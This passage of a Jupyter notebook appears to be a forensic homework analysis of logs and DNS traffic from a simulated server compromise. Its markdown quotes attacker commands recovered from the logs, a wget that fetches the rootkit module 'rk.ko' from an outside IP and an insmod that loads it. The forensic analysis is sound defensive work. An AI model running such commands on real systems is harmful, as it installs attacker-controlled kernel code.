    "non_uni_list_kernel_module=list(os_log.loc[(os_log['name']=='kernel_module')]['columns.name'])\n",
    "print('kernel module (added/removed) list:\\n\\n', list_kernel_module)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of GET request of \"rk.ko\": 2\n"
     ]
    }
   ],
   "source": [
    "# Identify the attacker-controlled kernel module\n",
    "\n",
    "# Extract a list of the Content-Type headers \n",
    "ls_content_type = []\n",
    "for i in range(len(http)):\n",
    "    try:\n",
    "        ls_content_type.append(http[i].http.content_type) # the Content-Type headers\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "cmd_=0\n",
    "for i in range(len(ls_content_type)):\n",
    "    if 'wget' in ls_content_type[i]:\n",
    "        cmd_+=1\n",
    "print('The number of GET request of \"rk.ko\":', cmd_)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$\n",
    "\\text{After searching all the contents in the Content-Type Headers, we only find two records with the GET request 'wget':}\\\\\n",
    "\\ \\ \\ \\bullet \\text{cmd='wget http://162.212.156.148/rk.ko > rk.ko'}\\\\\n",
    "\\ \\ \\ \\bullet \\text{cmd='wget http://162.212.156.148/rk.ko > rk.ko'}\\\\\n",
    "\\text{And the rk.ko is also in the kernel module (added/removed) list, so we can conclude that the kernel module named}\\\\\n",
    "\\text{'rk.ko' is attacker controlled module.}\n",
    "$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of Load request of \"rk.ko\": 3\n"
     ]
    }
   ],
   "source": [
    "# Verify that the kernel module that the attacker obtained in Task 1.2 has been loaded into the vulnerable server\n",
    "\n",
    "# Extract a list of the Content-Type headers sent to the vulnerable server\n",
    "ls_content_type = []\n",
    "for i in range(len(http)):\n",
    "    try:\n",
    "        if (http[i].ip.dst == '172.17.0.2'): # sent to the vulnerable server\n",
    "            ls_content_type.append(http[i].http.content_type) # the Content-Type headers\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "cmd_=0\n",
    "for i in range(len(ls_content_type)):\n",
    "    if 'insmod' in ls_content_type[i]:\n",
    "        cmd_+=1\n",
    "print('The number of Load request of \"rk.ko\":', cmd_)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$\n",
    "\\text{After searching all the contents  in the Content-Type Headers which are sent to the vulnerable server,}\\\\\n",
    "\\text{we only find three records with the Load Module request 'insmod':}\\\\\n",
    "\\ \\ \\ \\bullet \\text{cmd='insmod rk.ko.1'}\\\\\n",
    "\\ \\ \\ \\bullet \\text{cmd='insmod rk.ko.1'}\\\\\n",
    "\\ \\ \\ \\bullet \\text{cmd='insmod rk.ko.1'}\\\\\n",
    "\\text{These records of command show that the attackor controlled module 'rk.ko' is loaded in to the vulnerable server.}\n",
    "$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swpx',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swpx',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swpx',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts~',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts~',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp']"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Find the file name that contains the internal hostnames\n",
    "\n",
    "# filter out the columns.target_path that contains the string key word \n",
    "# 'host' to help us find the file contains the internal hostnames\n",
    "target_path=list(os_log['columns.target_path'].dropna())\n",
    "path_host=[]\n",
    "for i in range(len(target_path)):\n",
    "    if 'host' in target_path[i]:\n",
    "        path_host.append(target_path[i])\n",
    "        \n",
    "path_host"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$\n",
    "\\text{Here we find that the file \"known_hosts\" is the file that the folder \".ssh\"}\\\\\n",
    "\\text{(the important folder the attacker will use in the stage 5 of attack) contains.}\\\\ \n",
    "\\text{Thus, \"known_hosts\" is the file that contains the list of internal hostname.}\n",
    "$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of times the file \"known_hosts\" used in the Content-Type header: 0\n"
     ]
    }
   ],
   "source": [
    "# Look for evidence that the attacker extracted the internal host names via HTTP in the logs\n",
    "\n",
    "# Extract a list of the Content-Type headers \n",
    "ls_content_type = []\n",
    "for i in range(len(http)):\n",
    "    try:\n",
    "        ls_content_type.append(http[i].http.content_type) # the Content-Type headers\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "\n",
    "cmd_=0\n",
    "for i in range(len(ls_content_type)):\n",
    "    if 'known_hosts' in ls_content_type[i]:\n",
    "        cmd_+=1\n",
    "    if 'host' in ls_content_type[i]: #check all the possibilities\n",
    "        cmd_+=1\n",
    "    if 'know' in ls_content_type[i]:\n",
    "        cmd_+=1\n",
    "        \n",
    "print('The number of times the file \"known_hosts\" used in the Content-Type header:', cmd_)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$\n",
    "\\text{We can see that the http content-type headers do not contain any command that uses the internal name file \"known_hosts\",}\\\\\n",
    "\\text{so we can conclude that the attacker does not extract the list of internal hostnames via http.}\n",
    "$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### DNS Traffic Analysis (Attack Stages 6-7)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "src_ip           dst_ip         \n",
      "10.0.2.15        162.212.156.148    1120\n",
      "                 75.75.75.75          21\n",
      "162.212.156.148  10.0.2.15          1118\n",
      "75.75.75.75      10.0.2.15            21\n",
      "dtype: int64\n"
     ]
    }
   ],
   "source": [
    "# Identify the attacker-controlled DNS server and the legitimate DNS server\n",
    "print(df_dns.loc[df_dns.highest_layer == 'DNS'].groupby(['src_ip','dst_ip']).size())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$\n",
    "\\text{As we can see, there are three IP addresses given that there are only two DNS servers. Since \"10.0.2.15\" communicates}\\\\\n",
    "\\text{to both \"162.212.156.148\" and \"75.75.75.75\", \"162.212.156.148\" and \"75.75.75.75\" are the two DNS servers. According}\\\\ \n",
    "\\text{to TASK 1.2.a, we notice the command that \"(#cmd='wget http://162.212.156.148/rk.ko > rk.ko')\", so \"162.212.156.148\"}\\\\ \n",
    "\\text{is the DNS server, from which the attacker wants to download something bad. Therefore, \"162.212.156.148\" is the}\\\\ \n",
    "\\text{attacker-controlled DNS server while \"75.75.75.75\" is the legitimate DNS server.}\n",
    "$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1440x432 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Plot a distribution of the length of DNS queries for the two DNS servers on the same plot\n",
    "\n",
    "# the attacker-controlled DNS server\n",
    "len_at_dns = list(df_dns.loc[(df_dns.highest_layer == 'DNS') & (df_dns.dst_ip == '162.212.156.148')].length)\n",
    "\n",
    "# the legitimate DNS server\n",
    "len_le_dns = list(df_dns.loc[(df_dns.highest_layer == 'DNS') & (df_dns.dst_ip == '75.75.75.75')].length)\n",
    "\n",
    "fig, ax = plt.subplots(figsize=(20,6))\n",
    "ax.hist(len_at_dns, 15, density=True, histtype='step', stacked=True, fill=False, label='length of DNS queries for the attacker-controlled DNS server')\n",
    "ax.hist(len_le_dns, 15, density=True, histtype='step', stacked=True, fill=False, label='length of DNS queries for the legitimate DNS server')\n",
    "ax.legend(loc='upper right')\n",
    "\n",
    "plt.title(\"A Distribution of the Length of DNS Queries for the Two DNS Servers\")\n",
    "plt.xlabel(\"Length\")\n",
    "plt.ylabel(\"Probability Density\")\n",
    "plt.show()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
